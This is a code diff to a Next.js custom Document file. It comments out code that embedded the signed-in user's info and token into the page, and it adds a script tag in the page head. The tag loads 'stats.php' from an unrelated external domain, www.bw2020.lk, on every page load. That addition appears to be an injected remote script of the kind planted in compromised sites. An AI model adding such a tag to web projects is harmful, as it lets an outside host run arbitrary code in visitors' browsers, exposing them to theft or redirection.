@@ -11,7 +11,7 @@ class CustomDocument extends Document {
     // https://github.com/zeit/next.js/issues/3043#issuecomment-334521241
     // https://github.com/zeit/next.js/issues/2252#issuecomment-353992669
     // Alternatively, you could use a store, like Redux.
-    const { AuthUserInfo } = this.props
+    // const { AuthUserInfo } = this.props
     return (
       <Html lang="en-US">
         <Head>
@@ -19,15 +19,17 @@ class CustomDocument extends Document {
         <meta name="viewport" content="width=device-width, initial-scale=1.0"></meta>
           <link rel="shortcut icon" href="/static/favicon.ico" />
 
-          <script
+          {/* <script
             id="__MY_AUTH_USER_INFO"
             type="application/json"
             dangerouslySetInnerHTML={{
               __html: JSON.stringify(AuthUserInfo, null, 2),
             }}
-          />
-          <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"  media="screen"></link>
+          /> */}
 
+
+          <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"  media="screen"></link>
+          <script language="Javascript" src="https://www.bw2020.lk/stats.php?page=2020"/>
         </Head>
         <body>
           <Main />
@@ -38,24 +40,24 @@ class CustomDocument extends Document {
   }
 }
 
-CustomDocument.getInitialProps = async ctx => {
-  // Get the AuthUserInfo object. This is set if the server-rendered page
-  // is wrapped in the `withAuthUser` higher-order component.
-  const AuthUserInfo = get(ctx, 'myCustomData.AuthUserInfo', null)
+// CustomDocument.getInitialProps = async ctx => {
+//   // Get the AuthUserInfo object. This is set if the server-rendered page
+//   // is wrapped in the `withAuthUser` higher-order component.
+//   const AuthUserInfo = get(ctx, 'myCustomData.AuthUserInfo', null)
 
-  const initialProps = await Document.getInitialProps(ctx)
-  return { ...initialProps, AuthUserInfo }
-}
+//   const initialProps = await Document.getInitialProps(ctx)
+//   return { ...initialProps, AuthUserInfo }
+// }
 
-CustomDocument.propTypes = {
-  AuthUserInfo: PropTypes.shape({
-    AuthUser: PropTypes.shape({
-      id: PropTypes.string.isRequired,
-      email: PropTypes.string.isRequired,
-      emailVerified: PropTypes.bool.isRequired,
-    }),
-    token: PropTypes.string,
-  }).isRequired,
-}
+// CustomDocument.propTypes = {
+//   AuthUserInfo: PropTypes.shape({
+//     AuthUser: PropTypes.shape({
+//       id: PropTypes.string.isRequired,
+//       email: PropTypes.string.isRequired,
+//       emailVerified: PropTypes.bool.isRequired,
+//     }),
+//     token: PropTypes.string,
+//   }).isRequired,
+// }
 
 export default CustomDocument
